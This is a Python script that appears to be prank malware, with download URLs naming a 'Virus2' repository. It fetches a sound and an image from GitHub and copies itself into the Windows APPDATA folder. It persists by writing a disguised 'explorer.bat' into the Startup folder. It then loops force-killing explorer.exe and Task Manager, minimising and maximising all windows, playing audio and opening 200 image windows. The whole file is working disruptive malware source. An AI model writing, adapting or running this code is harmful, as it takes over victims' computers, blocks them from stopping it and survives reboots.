# Andrew Maney 2022

while True:
    try:
        # IMPORTS
        try:
            import os
            import sys
            from os import path
            import threading
            from playsound import playsound
            import requests
            import shutil
            import time
            from datetime import datetime
            from tkinter import *
            from random import randrange
        except:
            os.system("pip install " + "requests")
            os.system("pip install " + "playsound==1.2.2")
            import os
            import sys
            from os import path
            import threading
            from playsound import playsound
            import requests
            import shutil
            import time
            from datetime import datetime
            from tkinter import *
            from random import randrange



        # VARS
        AppDataPath = os.getenv('APPDATA')
        StartupPath = (AppDataPath + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        now = datetime.now()
        StartFunctions = True



        # FUNCTIONS

        def DownloadFiles():
            if("\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" in os.getcwd()):
                0+0
            elif(AppDataPath in os.getcwd()):
                0+0
            else:
                if(path.exists(AppDataPath + "/lmao.mp3")):
                    0+0
                else:
                    r = requests.get("https://github.com/MEMESCOEP/Virus2/blob/main/Hey%20Ya!%20Low%20quality.mp3?raw=true")
                    with open('./lmao.mp3', 'wb') as f:
                        f.write(r.content)
                    shutil.move('./lmao.mp3', AppDataPath)
                    #os.remove(AppDataPath + ".\\lmao.mp3")

                if(path.exists(AppDataPath + "/lmao.png")):
                    0+0
                else:
                    r = requests.get("https://github.com/MEMESCOEP/Virus2/raw/main/lmao.png")
                    with open('./lmao.png', 'wb') as f:
                        f.write(r.content)            
                    shutil.move('./lmao.png', AppDataPath)
                    #os.remove(AppDataPath + ".\\lmao.png")

                #shutil.move('.\\lmao.mp3', AppDataPath)
                #shutil.move('.\\lmao.png', AppDataPath)


        def PlaySound():
            pathtoaudio = AppDataPath + "/lmao.mp3"
            while True:
                #print("lmao")
                #time.sleep(0.1)            
                playsound(pathtoaudio, block=False)
                time.sleep(230)
                #print("lmao2")
                
                    


        def CopyFiles():
            
            if("\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" in os.getcwd()):
                0+0
            elif(AppDataPath in os.getcwd()):
                0+0
            else:
                minData = """powershell -command "& { $x = New-Object -ComObject Shell.Application; $x.minimizeall() }"""
                batData = """@echo off
{}
cd "{}"
python lmfao.py
pause
""".format(minData, AppDataPath)
                #shutil.copy(sys.argv[0], StartupPath)
                shutil.copy(sys.argv[0], AppDataPath)
                with open(StartupPath + "\\explorer.bat", "w") as f:
                    f.writelines(batData)
                    f.close


        def MinimizeWindows():
            while True:
                minData = """powershell -command "& { $x = New-Object -ComObject Shell.Application; $x.minimizeall() }"""
                os.system(minData)
                time.sleep(5)
                minData = """powershell -command "& { $x = New-Object -ComObject Shell.Application; $x.maximizeall() }"""
                os.system(minData)
                time.sleep(5)



        def KillProcesses():
            while True:
                os.system("taskkill /IM explorer.exe /F")
                os.system("taskkill /IM taskmgr.exe /F")
                time.sleep(15)



        def System():
            global StartFunctions
            pth = threading.Thread(target=PlaySound)
            kth = threading.Thread(target=KillProcesses)
            mth = threading.Thread(target=MinimizeWindows)
            while True:
                if(now.hour >= 8):  
                    if StartFunctions == True:          
                        pth.start()
                        kth.start()
                        mth.start()
                        #time.sleep(1)
                        #pth = None          
                        
                        #kth = None

                    StartFunctions = False
                    

                    #os.system("taskkill /IM explorer.exe /F")


                    window = Tk()
                    window.title('LMAO get neon catd lolololololololol')
                    
                    #window.resizable(False, False)            
                    canvas = Canvas(window, width = 1000, height = 300)
                    canvas.pack()
                    my_image = PhotoImage(file=(AppDataPath + "\\lmao.png"))
                    #my_image.width = 10000
                    canvas.create_image(0, 0, anchor = NW, image=my_image)
                    for x in range(200):
                        nw = Toplevel(window)
                        # get screen width and height
                        w = 1000
                        h = 300

                        # calculate x and y coordinates for the Tk root window
                        x = randrange(1281)
                        y = randrange(721)

                        canvas = Canvas(nw, width = w, height = h)
                        canvas.pack()
                        canvas.create_image(0, 0, anchor = NW, image=my_image)
                        nw.geometry('%dx%d+%d+%d' % (w, h, x, y))

                        nw.update()
                    window.mainloop()
                else:
                    time.sleep(1)


        DownloadFiles()
        CopyFiles()
        System()
        


        
    except Exception as EX:
        print(EX)
        with open("loglmao.txt", "w") as f:
            f.writelines(EX)
        #time.sleep(1000)



